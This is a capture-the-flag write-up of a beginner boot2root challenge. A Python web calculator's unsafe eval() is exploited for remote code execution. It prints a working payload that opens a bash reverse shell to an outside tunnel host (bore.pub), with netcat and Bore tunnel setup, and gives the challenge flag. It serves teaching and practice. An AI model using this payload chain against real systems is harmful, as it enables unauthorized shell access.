# BOREd2root (User) — Writeup

**Category:** Boot2Root
**Difficulty:** Beginner
**Author:** Quack


---

## Overview

BOREd2root (User) is a beginner Boot2Root challenge that demonstrates how an unsafe Python `eval()` implementation can lead to arbitrary code execution and eventually a reverse shell.

The challenge also introduces **Bore**, a TCP tunneling tool that can expose a local listener through a public endpoint when the attacking machine is behind NAT.

---

# 1. Enumeration

I started with an Nmap scan:

```bash
nmap -sC -sV bored2root-68fd74091d52a975-global.challs.brunnerne.xyz
```

Relevant results:

```text
80/tcp  open  http
443/tcp open  ssl/http
```

The HTTPS service hosted an application called:

> **Overtime Calculator**

---

# 2. Finding the Vulnerability

The application source revealed the following code:

```python
value = eval(expression)

if not isinstance(value, (int, float)):
    answer = "The calculator only prints numbers."
```

The important part is:

```python
eval(expression)
```

`eval()` executes Python code supplied by the user.

The challenge page even demonstrated that arbitrary Python expressions could be executed.

For example:

```python
2 ** 100
```

and:

```python
len("Brunner Inc")
```

The page also suggested:

```python
open("flag.txt").read()
```

However, because the application only returned numeric values, the contents of the file could not be directly displayed.

Therefore, the next step was to obtain a reverse shell.

---

# 3. Setting Up Netcat

I started a listener on port `4444`:

```bash
nc -lvnp 4444
```

Output:

```text
listening on [any] 4444 ...
```

However, the target could not directly connect to my machine because my machine was behind NAT.

The challenge specifically mentioned **Bore**.

---

# 4. Setting Up Bore

I installed Cargo:

```bash
sudo apt update
sudo apt install cargo -y
```

Then installed Bore:

```bash
cargo install bore-cli
```

I started the tunnel:

```bash
~/.cargo/bin/bore local 4444 --to bore.pub
```

Bore returned:

```text
INFO bore_cli::client: connected to server remote_port=12811
INFO bore_cli::client: listening at bore.pub:12811
```

So the connection path became:

```text
Target
   |
   v
bore.pub:12811
   |
   v
localhost:4444
   |
   v
Netcat
```

---

# 5. Exploiting `eval()`

I submitted the following payload to the calculator:

```python
__import__("os").system('bash -c "bash -i >& /dev/tcp/bore.pub/12811 0>&1" &')
```

The payload imports Python's `os` module and executes a Bash reverse shell.

The final `&` runs the shell in the background.

---

# 6. Getting the Shell

My Netcat listener received the connection:

```text
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50358
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
```

I checked the current user:

```bash
whoami
```

Output:

```text
intern
```

Then:

```bash
id
```

Output:

```text
uid=1000(intern) gid=1000(intern) groups=1000(intern)
```

So I successfully obtained a shell as the `intern` user.

---

# 7. User Flag

The user flag was located in the home directory:

```bash
cat ~/flag.txt
```

Flag:

```text
brunner{n0w_1_4m_4_c3rt1f13d_m0l3!}
```

---

# Attack Chain

```text
Overtime Calculator
        ↓
Unsafe eval()
        ↓
Python RCE
        ↓
Reverse Shell
        ↓
Bore Tunnel
        ↓
intern
        ↓
User Flag
```

## User Flag

```text
brunner{n0w_1_4m_4_c3rt1f13d_m0l3!}
```

---

## Key Vulnerability

The primary vulnerability was the use of:

```python
eval(expression)
```

on attacker-controlled input.

This allowed arbitrary Python code execution and ultimately led to a reverse shell.

**BOREd2root (User) — Pwned. 🔥**
